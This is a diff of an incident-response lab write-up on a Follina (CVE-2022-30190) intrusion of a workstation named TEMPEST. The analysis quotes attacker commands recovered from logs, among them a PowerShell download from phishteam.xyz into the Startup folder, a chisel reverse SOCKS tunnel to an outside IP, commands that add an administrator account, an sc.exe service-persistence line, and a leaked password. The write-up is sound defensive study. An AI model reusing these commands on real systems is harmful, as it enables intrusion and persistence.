@@ -8,9 +8,9 @@
 
 ## 1. Scenario
 
-A SOC analyst escalated a CRITICAL-severity alert involving a workstation (`TEMPEST`) believed to be compromised via a malicious document. As the assigned Incident Responder, the objective was to reconstruct the **full attack chain** — from initial delivery through to full administrative persistence — using only the artifacts provided: a Sysmon event log, a Windows Security event log, and a full packet capture of the incident.
+A SOC analyst escalated a CRITICAL-severity alert involving a workstation (`TEMPEST`) believed to be compromised via a malicious document. As the assigned Incident Responder, the objective was to reconstruct the **full attack chain** , from initial delivery through to full administrative persistence , using only the artifacts provided: a Sysmon event log, a Windows Security event log, and a full packet capture of the incident.
 
-The investigation followed the natural progression of the intrusion: initial access, staged payload execution, command-and-control (C2) establishment, internal discovery, privilege escalation, and finally persistence — with each phase cross-referenced against at least two of the three available data sources wherever possible.
+The investigation followed the natural progression of the intrusion: initial access, staged payload execution, command-and-control (C2) establishment, internal discovery, privilege escalation, and finally persistence , with each phase cross-referenced against at least two of the three available data sources wherever possible.
 
 ## 2. Objectives
 
@@ -39,7 +39,7 @@ Get-FileHash windows.evtx -Algorithm SHA256
 | `sysmon.evtx` | `665DC3519C2C235188201B5A8594FEA205C3BCBC75193363B87D2837ACA3C91F` |
 | `windows.evtx` | `D0279D5292BC5B25595115032820C978838678F4333B725998CFE9253E186D60` |
 
-## 4. Phase 1 — Initial Access: Malicious Document
+## 4. Phase 1 , Initial Access: Malicious Document
 
 The SOC had already established that a `.doc` file, downloaded via `chrome.exe`, was the intrusion's starting point. Analysis focused on Sysmon **Process Creation (Event ID 1)** and **DNS Query (Event ID 22)** events surrounding this file, tracing the process tree from `WINWORD.EXE` downward.
 
@@ -62,9 +62,9 @@ JGFwcD1bRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNhdGlvbkRhdGEnKTtjZCAiJGFw
 
 Given that this chain was ultimately executed through `msdt.exe` (the Microsoft Support Diagnostic Tool), external research into "msdt.exe Word document vulnerability" identified the specific exploit in use.
 
-**CVE exploited:** `CVE-2022-30190` (publicly known as **Follina** — a Microsoft Support Diagnostic Tool remote code execution vulnerability triggerable via a specially crafted Office document, without requiring macros).
+**CVE exploited:** `CVE-2022-30190` (publicly known as **Follina** , a Microsoft Support Diagnostic Tool remote code execution vulnerability triggerable via a specially crafted Office document, without requiring macros).
 
-## 5. Phase 2 — Stage 2 Execution
+## 5. Phase 2 , Stage 2 Execution
 
 Decoding the Base64 payload recovered in Phase 1 (via CyberChef) revealed the exact PowerShell command executed by the document:
 
@@ -72,7 +72,7 @@ Decoding the Base64 payload recovered in Phase 1 (via CyberChef) revealed the ex
 $app=[Environment]::GetFolderPath('ApplicationData');cd "$app\Microsoft\Windows\Start Menu\Programs\Startup"; iwr http://phishteam.xyz/02dcf07/update.zip -outfile update.zip; Expand-Archive .\update.zip -DestinationPath .; rm update.zip;
 ```
 
-This command downloaded an archive and extracted its contents directly into the current user's **Startup folder** — a straightforward autostart persistence mechanism ensuring re-execution on every login.
+This command downloaded an archive and extracted its contents directly into the current user's **Startup folder** , a straightforward autostart persistence mechanism ensuring re-execution on every login.
 
 **Full target path written:**
 ```
@@ -94,7 +94,7 @@ Correlating Event ID 22 (DNS) around the execution of `first.exe`, then pivoting
 
 **C2 domain and port:** `resolvecyber.xyz:80`
 
-## 6. Phase 3 — Malicious Document Traffic & C2 Protocol Analysis
+## 6. Phase 3 , Malicious Document Traffic & C2 Protocol Analysis
 
 With both malicious domains now known (`phishteam.xyz` from initial delivery, `resolvecyber.xyz` from stage 2 C2), the packet capture was reviewed directly for the corresponding HTTP traffic.
 
@@ -119,7 +119,7 @@ Reviewing the User-Agent string on this traffic revealed the compiler/runtime si
 
 This detail is notable: Nim-compiled malware has increasingly been used by threat actors specifically because it produces binaries with low antivirus detection rates relative to more common languages.
 
-## 7. Phase 4 — Discovery: Internal Reconnaissance
+## 7. Phase 4 , Discovery: Internal Reconnaissance
 
 Decoding the Base64-encoded C2 traffic (command/output pairs) surfaced the attacker's manual reconnaissance activity conducted through the implant. Among the recovered commands was a file read that disclosed hardcoded credentials:
 
@@ -135,13 +135,13 @@ $credential = New-Object System.Management.Automation.PSCredential $user, $secur
 
 **Password discovered:** `infernotempest`
 
-This is a textbook example of **credentials in files** — an automation/scripting artifact left on disk containing plaintext domain credentials, discovered by an attacker already inside the host rather than through any external attack.
+This is a textbook example of **credentials in files** , an automation/scripting artifact left on disk containing plaintext domain credentials, discovered by an attacker already inside the host rather than through any external attack.
 
 The attacker also enumerated listening ports via `netstat -ano -p tcp`, identifying a service suitable for remote access:
 
 **Listening port used for remote shell access:** `5985` (Windows Remote Management / WinRM)
 
-## 8. Phase 5 — C2 Tooling and Lateral Access Establishment
+## 8. Phase 5 , C2 Tooling and Lateral Access Establishment
 
 Continuing to trace network activity from the compromised host, the attacker was observed downloading and executing a SOCKS proxy tool:
 
@@ -158,13 +158,13 @@ C:\Users\benimaru\Downloads\ch.exe client 167.71.199.191:8080 R:socks
 
 A hash lookup against VirusTotal identified the binary.
 
-**Tool identified:** `chisel` — a legitimate, open-source TCP/UDP tunneling utility frequently abused offensively to pivot through firewalled/NAT'd networks by establishing a reverse SOCKS proxy back to the attacker.
+**Tool identified:** `chisel` , a legitimate, open-source TCP/UDP tunneling utility frequently abused offensively to pivot through firewalled/NAT'd networks by establishing a reverse SOCKS proxy back to the attacker.
 
 With the tunnel established, the attacker pivoted through it to reach internal services. Reviewing process/network activity by `benimaru` immediately following the proxy's establishment identified the authentication method used to gain interactive access.
 
 **Service used to authenticate:** `WinRM`
 
-## 9. Phase 6 — Privilege Escalation
+## 9. Phase 6 , Privilege Escalation
 
 With a low-privileged interactive shell established via the SOCKS-tunneled WinRM session, the attacker moved to escalate privileges. Correlating C2/proxy traffic with Wireshark against the known C2 domain revealed a second binary download.
 
@@ -172,9 +172,9 @@ With a low-privileged interactive shell established via the SOCKS-tunneled WinRM
 
 A VirusTotal hash lookup identified the tool.
 
-**Tool identified:** `PrintSpoofer` — a well-known Windows local privilege-escalation tool that abuses named-pipe impersonation to escalate from a service account with a specific dangerous privilege to `NT AUTHORITY\SYSTEM`.
+**Tool identified:** `PrintSpoofer` , a well-known Windows local privilege-escalation tool that abuses named-pipe impersonation to escalate from a service account with a specific dangerous privilege to `NT AUTHORITY\SYSTEM`.
 
-**Privilege abused:** `SeImpersonatePrivilege` — this privilege (along with `SeAssignPrimaryTokenPrivilege`) allows a process to impersonate the security context of another user via APIs such as `CreateProcessWithToken()`, and is commonly present on service accounts by design, making it a frequent target for this class of attack.
+**Privilege abused:** `SeImpersonatePrivilege` , this privilege (along with `SeAssignPrimaryTokenPrivilege`) allows a process to impersonate the security context of another user via APIs such as `CreateProcessWithToken()`, and is commonly present on service accounts by design, making it a frequent target for this class of attack.
 
 After successful escalation, the attacker executed `PrintSpoofer` together with a second binary to re-establish a fresh, elevated C2 channel.
 
@@ -182,12 +182,12 @@ After successful escalation, the attacker executed `PrintSpoofer` together with 
 
 **C2 port used by this new connection (distinct from the initial C2 channel):** `8080`
 
-## 10. Phase 7 — Actions on Objectives: Persistence as SYSTEM
+## 10. Phase 7 , Actions on Objectives: Persistence as SYSTEM
 
-With `NT AUTHORITY\SYSTEM`-level access established via `final.exe`, the attacker proceeded to entrench access through multiple, redundant persistence mechanisms — a hallmark of a deliberate, hands-on-keyboard intrusion rather than a purely automated one.
+With `NT AUTHORITY\SYSTEM`-level access established via `final.exe`, the attacker proceeded to entrench access through multiple, redundant persistence mechanisms , a hallmark of a deliberate, hands-on-keyboard intrusion rather than a purely automated one.
 
 **Account creation:**
-Searching Sysmon Event ID 1 for `user /add` revealed a failed creation attempt followed by successful account creation. The failed attempt was missing the `/add` switch itself — a minor operator error preceding the successful commands.
+Searching Sysmon Event ID 1 for `user /add` revealed a failed creation attempt followed by successful account creation. The failed attempt was missing the `/add` switch itself , a minor operator error preceding the successful commands.
 
 **Accounts created (alphabetical order):** `shion`, `shuna`
 
@@ -201,7 +201,7 @@ net localgroup administrators /add shion
 **Windows Security Event ID confirming addition to a sensitive local group:** `4732`
 
 **Persistent administrative access via malicious service creation:**
-Filtering Sysmon Event ID 1 for `final.exe` (the elevated C2 binary established during privilege escalation) revealed the attacker registering it as a Windows service — ensuring the C2 implant would survive reboots and run with SYSTEM privileges going forward:
+Filtering Sysmon Event ID 1 for `final.exe` (the elevated C2 binary established during privilege escalation) revealed the attacker registering it as a Windows service , ensuring the C2 implant would survive reboots and run with SYSTEM privileges going forward:
 
 ```
 C:\Windows\system32\sc.exe \\TEMPEST create TempestUpdate2 binpath= C:\ProgramData\final.exe start= auto
@@ -256,7 +256,7 @@ sc.exe → "TempestUpdate2" service created (auto-start, binpath = final.exe) �
 | Tactic | Technique ID | Technique Name | Evidence |
 |---|---|---|---|
 | Initial Access | [T1566.001](https://attack.mitre.org/techniques/T1566/001/) | Phishing: Spearphishing Attachment | `free_magicules.doc` downloaded and opened by the user |
-| Execution | [T1218.007](https://attack.mitre.org/techniques/T1218/007/) | System Binary Proxy Execution: Msiexec *(closest category — MSDT abuse)* / [T1203](https://attack.mitre.org/techniques/T1203/) | Exploitation of `msdt.exe` via CVE-2022-30190 (Follina) |
+| Execution | [T1218.007](https://attack.mitre.org/techniques/T1218/007/) | System Binary Proxy Execution: Msiexec *(closest category , MSDT abuse)* / [T1203](https://attack.mitre.org/techniques/T1203/) | Exploitation of `msdt.exe` via CVE-2022-30190 (Follina) |
 | Execution | [T1059.001](https://attack.mitre.org/techniques/T1059/001/) | Command and Scripting Interpreter: PowerShell | Base64-encoded PowerShell payload executed by the document |
 | Persistence | [T1547.001](https://attack.mitre.org/techniques/T1547/001/) | Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder | Payload written to the user's Startup folder |
 | Execution / Defense Evasion | [T1105](https://attack.mitre.org/techniques/T1105/) | Ingress Tool Transfer | `certutil.exe` abused to download `first.exe` and `ch.exe` |
@@ -273,11 +273,11 @@ sc.exe → "TempestUpdate2" service created (auto-start, binpath = final.exe) �
 
 ## 13. Key Takeaways
 
-- **A single unpatched client-side vulnerability opened the entire chain.** CVE-2022-30190 (Follina) required no macros and minimal user interaction, making the initial compromise nearly frictionless once the document was opened — reinforcing the value of patching MSDT-related vulnerabilities and disabling the protocol handler where feasible.
-- **LOLBIN abuse remained a constant thread throughout the intrusion.** `certutil.exe` for payload delivery is a low-noise, high-reliability technique precisely because it is a trusted, signed system utility — application allow-listing and command-line-argument monitoring are far more effective controls here than binary blocklisting.
-- **Legitimate open-source tools made excellent offensive infrastructure.** Both `chisel` (tunneling) and the eventual privilege-escalation binary were publicly available, well-documented tools — no custom malware development was required for the network-pivoting or privilege-escalation stages.
+- **A single unpatched client-side vulnerability opened the entire chain.** CVE-2022-30190 (Follina) required no macros and minimal user interaction, making the initial compromise nearly frictionless once the document was opened , reinforcing the value of patching MSDT-related vulnerabilities and disabling the protocol handler where feasible.
+- **LOLBIN abuse remained a constant thread throughout the intrusion.** `certutil.exe` for payload delivery is a low-noise, high-reliability technique precisely because it is a trusted, signed system utility , application allow-listing and command-line-argument monitoring are far more effective controls here than binary blocklisting.
+- **Legitimate open-source tools made excellent offensive infrastructure.** Both `chisel` (tunneling) and the eventual privilege-escalation binary were publicly available, well-documented tools , no custom malware development was required for the network-pivoting or privilege-escalation stages.
 - **Redundant persistence is a sign of a deliberate, patient adversary.** Creating two new local accounts, elevating one to Administrators, and separately registering a disguised auto-start SYSTEM service all point to an attacker ensuring multiple independent paths back into the host, not merely a single foothold.
-- **Cross-referencing Sysmon, Windows Security logs, and packet capture was essential at every stage.** No single data source told the complete story — DNS queries confirmed domains, process creation events confirmed execution and parentage, Windows Security event IDs (4720, 4732) confirmed account and group changes with authoritative timestamps, and packet capture confirmed what was actually transmitted over the wire.
+- **Cross-referencing Sysmon, Windows Security logs, and packet capture was essential at every stage.** No single data source told the complete story , DNS queries confirmed domains, process creation events confirmed execution and parentage, Windows Security event IDs (4720, 4732) confirmed account and group changes with authoritative timestamps, and packet capture confirmed what was actually transmitted over the wire.
 
 ## 14. Recommendations
 
@@ -294,4 +294,4 @@ sc.exe → "TempestUpdate2" service created (auto-start, binpath = final.exe) �
 
 ## 15. Conclusion
 
-This investigation reconstructed a complete, multi-stage intrusion — from a single malicious document exploiting a known Microsoft vulnerability, through staged payload delivery, credential harvesting, network pivoting via a legitimate tunneling tool, privilege escalation via a well-documented Windows exploitation technique, and finally redundant, SYSTEM-level persistence. At no point did the attacker rely on custom or novel tooling; every stage used a publicly available technique or tool, underscoring that effective detection and response depend on strong baseline monitoring (process creation, DNS, account/group changes, service creation) rather than signature-based detection of "exotic" malware alone.
+This investigation reconstructed a complete, multi-stage intrusion , from a single malicious document exploiting a known Microsoft vulnerability, through staged payload delivery, credential harvesting, network pivoting via a legitimate tunneling tool, privilege escalation via a well-documented Windows exploitation technique, and finally redundant, SYSTEM-level persistence. At no point did the attacker rely on custom or novel tooling; every stage used a publicly available technique or tool, underscoring that effective detection and response depend on strong baseline monitoring (process creation, DNS, account/group changes, service creation) rather than signature-based detection of "exotic" malware alone.
